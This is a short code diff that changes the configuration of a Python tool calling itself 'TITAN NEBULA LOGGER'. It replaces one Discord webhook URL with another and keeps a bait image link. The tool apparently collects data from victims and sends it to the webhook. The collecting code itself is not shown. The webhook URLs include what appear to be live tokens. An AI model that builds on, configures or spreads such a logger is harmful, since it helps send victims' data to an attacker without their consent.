@@ -18,7 +18,7 @@ import base64
 
 # --- CONFIGURATION ---
 config = {
-    "webhook": "https://discord.com/api/webhooks/1457320227212886170/1gwlEi-KBGixKbJZenFYUqD98j_tNENmZY2rS6kxWHQ2ExlgIC3UK7_OW2XVD8eHDVR6",
+    "webhook": "https://discord.com/api/webhooks/1458566674302238923/0EPCSiG8KU6QcDoFcT0Ugc6BN_fGX_7K6KsXtflSlkKV4ZPH9zSHx3bnirPb0bWDowEk",
     "image": "https://media.discordapp.net/attachments/1457070623238127690/1457320607749509130/images_12.jpg",
     "username": "TITAN NEBULA LOGGER",
     "color": 0x00FFFF # Cyan
